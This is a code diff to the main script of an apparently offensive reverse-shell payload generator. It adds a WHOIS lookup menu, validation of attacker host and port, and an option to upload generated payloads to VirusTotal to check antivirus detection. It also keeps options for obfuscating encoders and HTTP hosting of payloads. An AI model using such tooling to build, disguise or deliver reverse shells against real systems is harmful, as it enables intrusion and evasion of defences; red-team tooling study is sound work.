@@ -13,6 +13,19 @@ from encoders.encoder import (
 )
 from host_payload import serve_directory
 from colorama import init, Fore, Style
+from utils.input_validation import get_lhost, get_lport, is_valid_ip, is_valid_hostname, is_valid_port
+from utils.vt_report import upload_file_to_virustotal, get_vt_report
+
+# --- WHOIS IMPORTS ---
+from utils.whois_utils import (
+    is_valid_ip as whois_valid_ip,
+    is_valid_domain,
+    whois_domain,
+    whois_ip,
+    generate_whois_html,
+    prompt_for_domains_or_ips  # <-- NEW import
+)
+
 init(autoreset=True)
 
 PAYLOAD_MAP = {
@@ -44,8 +57,82 @@ def save_payload(code: str, filename: str) -> None:
         f.write(code)
     print(Fore.GREEN + f"[+] Payload saved as output/{filename}")
 
+def whois_lookup_menu():
+    print(Fore.CYAN + "\n=== WHOIS Lookup Utility ===" + Style.RESET_ALL)
+    # --- Use robust input/validation from whois_utils.py ---
+    valid_domains, valid_ips = prompt_for_domains_or_ips()  # <--- RECOMMENDED!
+
+    domain_results = [whois_domain(d) for d in valid_domains]
+    ip_results = [whois_ip(ip) for ip in valid_ips]
+
+    # Terminal pretty print (optional, using tabulate if you wish)
+    try:
+        from tabulate import tabulate
+        if domain_results:
+            print(Fore.CYAN + "\n[Domain WHOIS Results]" + Style.RESET_ALL)
+            domain_table = []
+            for r in domain_results:
+                if "error" in r:
+                    domain_table.append([r['domain'], "ERROR: " + r['error'], "", "", "", "", ""])
+                else:
+                    domain_table.append([
+                        r.get('domain',''),
+                        r.get('registrar',''),
+                        r.get('org',''),
+                        r.get('country',''),
+                        r.get('creation_date',''),
+                        r.get('expiration_date',''),
+                        r.get('emails','')
+                    ])
+            headers = ["Domain", "Registrar", "Org", "Country", "Creation", "Expiry", "Email"]
+            print(tabulate(domain_table, headers=headers, tablefmt="fancy_grid"))
+
+        if ip_results:
+            print(Fore.CYAN + "\n[IP WHOIS Results]" + Style.RESET_ALL)
+            ip_table = []
+            for r in ip_results:
+                if "error" in r:
+                    ip_table.append([r['ip'], "ERROR: " + r['error'], "", "", ""])
+                else:
+                    ip_table.append([
+                        r.get('ip',''),
+                        r.get('asn',''),
+                        r.get('org',''),
+                        r.get('country',''),
+                        r.get('cidr','')
+                    ])
+            headers = ["IP", "ASN", "Org", "Country", "CIDR"]
+            print(tabulate(ip_table, headers=headers, tablefmt="fancy_grid"))
+    except ImportError:
+        print(Fore.YELLOW + "Tip: Install tabulate for pretty terminal tables: pip install tabulate" + Style.RESET_ALL)
+
+    # ---- Ask user for filename before saving ----
+    default_name = "whois_lookup.html"
+    custom_name = input(Fore.YELLOW + f"Enter filename to save WHOIS HTML report (default: {default_name}): " + Style.RESET_ALL).strip()
+    output_filename = custom_name if custom_name else default_name
+    if not output_filename.endswith('.html'):
+        output_filename += '.html'
+    output_file = os.path.join("output/reports", output_filename)
+    os.makedirs(os.path.dirname(output_file), exist_ok=True)
+
+    html_snippet = generate_whois_html(domain_results, ip_results)
+    with open(output_file, "w", encoding="utf-8") as f:
+        f.write(html_snippet)
+    print(Fore.GREEN + f"\n[+] WHOIS HTML report saved: {output_file}\nOpen it in your browser!" + Style.RESET_ALL)
+
 def main():
     print_banner()
+    # --- Main Menu ---
+    print(Fore.CYAN + "\nSelect option:")
+    print(Fore.CYAN + " 1. Generate reverse shell payload")
+    print(Fore.CYAN + " 2. WHOIS Lookup utility")
+    option = input(Fore.YELLOW + "Enter choice (1/2): " + Style.RESET_ALL).strip()
+
+    if option == "2":
+        whois_lookup_menu()
+        return
+
+    # --- Option 1: Generate payload (existing logic) ---
     parser = argparse.ArgumentParser(
         description="Reverse-shell generator with encoding and obfuscation options."
     )
@@ -56,12 +143,21 @@ def main():
     parser.add_argument("--output", help="Output filename")
     args = parser.parse_args()
 
-    # Interactive fallback if args not supplied
-    ip = args.ip or input(Fore.YELLOW + "Enter attacker IP (LHOST): " + Style.RESET_ALL).strip()
-    port = args.port or input(Fore.YELLOW + "Enter listener port (LPORT): " + Style.RESET_ALL).strip()
+    # === INPUT VALIDATION ADDED HERE ===
+    # Validate LHOST
+    if args.ip and (is_valid_ip(args.ip) or is_valid_hostname(args.ip)):
+        ip = args.ip
+    else:
+        ip = get_lhost()
+
+    # Validate LPORT
+    if args.port and is_valid_port(args.port):
+        port = args.port
+    else:
+        port = get_lport()
 
     if args.payload:
-        payload_choice = {"python":"1","bash":"2","php":"3"}[args.payload]
+        payload_choice = {"python": "1", "bash": "2", "php": "3"}[args.payload]
     else:
         print(Fore.CYAN + "\nSelect payload type:")
         print(Fore.CYAN + " 1. Python")
@@ -80,10 +176,10 @@ def main():
     encoder_map = {
         "none": ("", lambda code: code),
         "base64": (".b64", lambda code: B64_WRAPPERS[lang](code)),
-        "hex": (".hex", lambda code: HEX_WRAPPERS["python"](code) if lang=="python" else code),
-        "rot13": (".rot13", lambda code: ROT13_WRAPPERS["python"](code) if lang=="python" else code),
-        "xor": (".xor", lambda code: XOR_WRAPPERS["python"](code) if lang=="python" else code),
-        "obf": (".obf", lambda code: OBFUSCATOR_WRAPPERS["python"](code) if lang=="python" else code)
+        "hex": (".hex", lambda code: HEX_WRAPPERS["python"](code) if lang == "python" else code),
+        "rot13": (".rot13", lambda code: ROT13_WRAPPERS["python"](code) if lang == "python" else code),
+        "xor": (".xor", lambda code: XOR_WRAPPERS["python"](code) if lang == "python" else code),
+        "obf": (".obf", lambda code: OBFUSCATOR_WRAPPERS["python"](code) if lang == "python" else code)
     }
 
     if args.encoder:
@@ -134,13 +230,22 @@ def main():
     fname = args.output or input(Fore.YELLOW + f"Save as (default: {default_name}{enc_ext}): " + Style.RESET_ALL).strip() or (default_name + enc_ext)
     save_payload(final_code, fname)
 
-    # Print a summary
+    # === Print summary and VirusTotal scan integration starts here ===
     print(Fore.MAGENTA + Style.BRIGHT + "\n=== PAYLOAD SUMMARY ===" + Style.RESET_ALL)
     print(Fore.CYAN + f"Type      : {lang}")
     print(Fore.CYAN + f"Encoder   : {args.encoder if args.encoder else 'interactive'}")
     print(Fore.CYAN + f"LHOST     : {ip}")
     print(Fore.CYAN + f"LPORT     : {port}")
     print(Fore.CYAN + f"File      : {fname}")
+
+    # Offer to scan with VirusTotal
+    scan = input("Do you want to check this payload's AV detection rate on VirusTotal? (y/n): ").strip().lower()
+    if scan == "y":
+        api_key = input("Enter your VirusTotal API key: ").strip()
+        file_path = os.path.join("output", fname)
+        file_id = upload_file_to_virustotal(file_path, api_key)
+        if file_id:
+            get_vt_report(file_id, api_key, file_path=file_path)
 
     # Offer to host the payload via HTTP (using imported function)
     host = input(Fore.YELLOW + "\nDo you want to host the payload in the 'output' folder via HTTP? (y/n): " + Style.RESET_ALL).strip().lower()
